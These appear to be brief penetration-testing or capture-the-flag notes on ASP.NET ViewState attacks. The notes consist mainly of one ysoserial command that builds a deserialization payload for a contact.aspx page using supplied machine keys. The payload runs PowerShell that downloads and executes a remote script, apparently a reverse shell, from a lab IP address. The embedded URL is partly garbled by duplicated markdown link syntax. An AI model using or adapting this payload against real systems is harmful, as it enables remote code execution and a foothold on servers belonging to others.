
sub domain enum

viewstate hacktricks

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe iex ((New-Object System.Net.WebClient).DownloadString('[http://10.10.16.29:444/rs.ps1')](http://10.10.16.29:444/rs.ps1') "http://10.10.16.29:444/rs.ps1')"))" --path="/portfolio/contact.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```